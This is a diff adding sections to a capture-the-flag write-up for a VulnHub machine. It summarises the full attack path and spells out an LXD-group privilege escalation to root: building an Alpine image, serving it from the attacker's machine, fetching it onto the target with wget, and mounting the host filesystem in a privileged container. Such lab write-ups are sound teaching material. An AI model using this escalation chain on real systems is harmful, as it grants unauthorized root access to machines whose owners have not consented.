@@ -12,7 +12,7 @@ You can find the machine there > [Bizarre Adventure Mrr3b0t](https://www.vulnhub
 
 ## Summary
 
-This box is really similar to Bizarre Adventure Sticky Fingers. Let's pwn it! :sunglasses:
+This box is really similar to Bizarre Adventure Sticky Fingers. We start by doing stego on an image to find a username & with it we brute force the login page. Bypassing the file upload form we get a reverse shell! Shell as exploiter was a basic reverse engineering on a binary. Shell as root we exploit LXD group. Let's pwn it! :sunglasses:
 
 ## Enumeration/Reconnaissance
 
@@ -156,3 +156,87 @@ uid=1000(exploiter) gid=1000(exploiter) groups=1000(exploiter),24(cdrom),30(dip)
 ```
 
 ## Shell as root
+
+Privesc to root is simple, user exploiter is in lxd group:
+
+```
+exploiter@mrr3b0t:~$ groups
+exploiter cdrom dip plugdev lxd lpadmin sambashare
+```
+
+Let's build Alpine first on our system:
+
+```
+$ git clone https://github.com/saghul/lxd-alpine-builder.git
+Cloning into 'lxd-alpine-builder'...
+remote: Enumerating objects: 27, done.
+remote: Total 27 (delta 0), reused 0 (delta 0), pack-reused 27
+Unpacking objects: 100% (27/27), 15.98 KiB | 154.00 KiB/s, done.
+$ cd lxd-alpine-builder 
+$ ./build-alpine 
+$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Let's wget on target box now:
+
+```
+exploiter@mrr3b0t:/tmp$ wget -q 192.168.1.14/alpine-v3.12-x86_64-20200924_0216.tar.gz
+```
+
+Follow my steps:
+
+```
+exploiter@mrr3b0t:/tmp$ lxc image import alpine-v3.12-x86_64-20200924_0216.tar.gz --alias rootbox
+Image imported with fingerprint: 0c06cdcf498d081a54c82e7673f9a4f480ddc5555d12d8625f0083ec9542adb5
+
+exploiter@mrr3b0t:/tmp$ lxc init rootbox newprof -c security.privileged=true
+Creating newprof
+
+exploiter@mrr3b0t:/tmp$ lxc config device add newprof container disk source=/ path=/mnt recursive=true
+Device container added to newprof
+
+exploiter@mrr3b0t:/tmp$ lxc exec newprof /bin/sh
+~ # whoami;id
+root
+uid=0(root) gid=0(root)
+```
+
+Let's read the flag:
+
+```
+/mnt/root # cat flag.txt.txt 
+                 uuuuuuu
+             uu$$$$$$$$$$$uu
+          uu$$$$$$$$$$$$$$$$$uu
+         u$$$$$$$$$$$$$$$$$$$$$u
+        u$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$$$$$$$$$$$$$$$$$$$$u
+       u$$$$$$"   "$$$"   "$$$$$$u
+       "$$$$"      u$u       $$$$"
+        $$$u       u$u       u$$$
+        $$$u      u$$$u      u$$$
+         "$$$$uu$$$   $$$uu$$$$"
+          "$$$$$$$"   "$$$$$$$"
+            u$$$$$$$u$$$$$$$u
+             u$"$"$"$"$"$"$u
+  uuu        $$u$ $ $ $ $u$$       uuu
+ u$$$$        $$$$$u$u$u$$$       u$$$$
+  $$$$$uu      "$$$$$$$$$"     uu$$$$$$
+u$$$$$$$$$$$uu    """""    uuuu$$$$$$$$$$
+$$$$"""$$$$$$$$$$uuu   uu$$$$$$$$$"""$$$"
+ """      ""$$$$$$$$$$$uu ""$"""
+           uuuu ""$$$$$$$$$$uuu
+  u$$$uuu$$$$$$$$$uu ""$$$$$$$$$$$uuu$$$
+  $$$$$$$$$$""""           ""$$$$$$$$$$$"
+   "$$$$$"                      ""$$$$""
+     $$$"                         $$$$"
+
+FLAG{3LEV4T0R_P3NT3ST}
+
+Created by Joas Antonio
+Linkedin:https://bit.ly/3ki1WBE
+```
+
+Awesome box! :smile:
